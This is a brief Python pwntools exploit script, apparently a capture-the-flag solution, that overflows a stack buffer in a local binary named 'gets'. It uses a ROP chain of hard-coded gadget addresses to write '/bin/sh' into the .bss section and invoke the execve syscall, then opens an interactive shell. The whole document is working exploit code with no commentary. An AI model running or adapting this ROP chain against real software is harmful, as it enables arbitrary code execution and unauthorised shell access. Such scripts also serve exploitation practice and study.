from pwn import *


pop_eax = 0x080b81c6
pop_ebx = 0x080481c9
pop_ecx = 0x080de955
pop_edx = 0x0806f02a
mv_dword_edx_eax = 0x080549db
sys_call = 0x0806cc25

buf = 0x80eaf80 # bss

payload  = 'a'*0x18 + 'a'*0x4 + p32(pop_edx) + p32(buf) + p32(pop_eax) + '/bin' + p32(mv_dword_edx_eax)
payload += p32(pop_eax) + '/sh\x00' + p32(pop_edx) + p32(buf+0x4) + p32(mv_dword_edx_eax)
payload += p32(pop_eax) + p32(0xb) + p32(pop_ebx) + p32(buf) + p32(pop_ecx) + p32(0) + p32(pop_edx) + p32(0)
payload += p32(sys_call)


r = process('./gets')
r.recvuntil('!\n')
r.sendline(payload)

r.interactive()		
